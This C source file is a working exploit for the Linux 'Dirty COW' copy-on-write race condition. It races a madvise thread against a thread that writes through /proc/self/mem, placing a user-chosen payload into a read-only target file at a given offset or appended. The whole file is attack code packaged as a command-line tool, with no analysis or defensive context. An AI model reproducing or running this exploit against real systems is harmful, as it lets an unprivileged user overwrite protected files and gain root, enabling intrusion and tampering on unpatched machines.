#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

#include <getopt.h>
#include <unistd.h>

#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>

#define ERR_IF(cond) \
	do { \
		if (cond) {	\
			perror(__func__); \
			exit(EXIT_FAILURE); \
		} \
	} while (0)

#define ERR_IF_PTHREAD(status) \
	do { \
		int _val = status; \
		if (_val > 0) {	\
			fprintf(stderr, "%s: %s\n", __func__, strerror(_val)); \
			exit(EXIT_FAILURE); \
		} \
	} while (0)

#define VIRTUAL_MEMORY "/proc/self/mem"
#define THREAD_ITERATIONS 10000

typedef struct payload_info {
	char *string;
	off_t offset;
	void *loc_in_mem;
    int target_fd;
    int input_fd;
    bool append;
} PayloadInfo;

// Write payload to mmap'd memory
void *writer_thread(void *arg) {
	PayloadInfo *info = arg;
	char *str = info->string;

	int fd = open(VIRTUAL_MEMORY, O_RDWR);
	ERR_IF(fd < 0);

	for (int i = 0; i < THREAD_ITERATIONS; i++) {
		if (info->append) {
			lseek(fd, (uintptr_t) info->loc_in_mem, SEEK_END);
		} else {
			lseek(fd, (uintptr_t) info->loc_in_mem + info->offset, SEEK_SET);
		}

		write(fd, str, strlen(str));
	}

	return NULL;
}

// Advise kernel to drop mapping
void *madviser_thread(void *arg) {
	PayloadInfo *info = arg;

	for (int i = 0; i < THREAD_ITERATIONS; i++) {
		madvise(info->loc_in_mem, 100, MADV_DONTNEED);
	}

	return NULL;
}

// Load Payload into string from specified file
char *loadPayload(int fd) {
	int size_file = lseek(fd, 0, SEEK_END);
	lseek(fd, 0, SEEK_SET);
	char *string_ptr = calloc(size_file, sizeof(char));
	ERR_IF(read(fd, string_ptr, size_file) < 0);
	string_ptr[size_file] = '\0';
	return string_ptr;
}

void print_help() {
	printf("-f, --file   \t name of file contatining the payload\n"
			"-s, --string\t use command line arg string as payload\n"
			"-o, --offset\t offset postition for lseek (hex)\n"
			"-a, --append\t append to target file\n"
			"-h, --help  \t help print out\n"
			"\nTarget file name must be the last argument\n");
}

PayloadInfo parse_opts(int argc, char *argv[]) {
	PayloadInfo info = {
		.input_fd = STDIN_FILENO,
		.offset = 0x0,
		.append = false
	};

	int c;

 	while (true) {
		int option_index = 0;
		static struct option long_options[] = {
			{"file",    required_argument, 0, 'f' },
			{"append",  no_argument,       0, 'a' },
			{"string",  no_argument,       0, 's' },
			{"offset",  required_argument, 0, 'o' },
			{"help",    no_argument,       0, 'h' },
			{0,         0,                 0,  0  }
		};

		c = getopt_long(argc, argv, "ahs:f:o:", long_options, &option_index);

		if (c == -1)
			break;

		switch (c) {
			case 0:
				printf("option %s", long_options[option_index].name);

				if (optarg) {
					printf (" with arg %s", optarg);
				}

				printf ("\n");
				break;
			case 'f':  // file containing payload
				info.input_fd = open(optarg, O_RDONLY);
				ERR_IF(info.input_fd < 0);
				info.string = loadPayload(info.input_fd);
				break;
			case 'o':  // offset position for payload (hex)
				sscanf(optarg, "%x", (unsigned int*) &info.offset);
				break;
			case 's':
				info.string = argv[optind-1];
				break;
			case 'a':  // append to target file
				info.append = true;
				break;
			case 'h':
				print_help();
				break;
			case ':': // no option specified
				printf("option needs a value\n");
				break;
			case '?': // unknown option
				printf("unkown option: %c\n", optopt);
				break;
			default:
				printf("?? getopt returned character code 0%o ??\n", c);
				abort();
		}
	}

	// Open target file
	info.target_fd = open(argv[argc-1], O_RDONLY);
	ERR_IF(info.target_fd < 0);

	return info;
}

int main(int argc, char *argv[]) {
	PayloadInfo info = parse_opts(argc, argv);

	struct stat file_info;
	ERR_IF(fstat(info.target_fd, &file_info) < 0);

	info.loc_in_mem = mmap(NULL, file_info.st_size, PROT_READ, MAP_PRIVATE, info.target_fd, 0);

	pthread_t thread_1, thread_2;

	ERR_IF_PTHREAD(pthread_create(&thread_1, NULL, madviser_thread, &info));
	ERR_IF_PTHREAD(pthread_create(&thread_2, NULL, writer_thread, &info));

	ERR_IF_PTHREAD(pthread_join(thread_1, NULL));
	ERR_IF_PTHREAD(pthread_join(thread_2, NULL));

	close(info.input_fd);
	close(info.target_fd);
	free(info.string);

	return EXIT_SUCCESS;
}

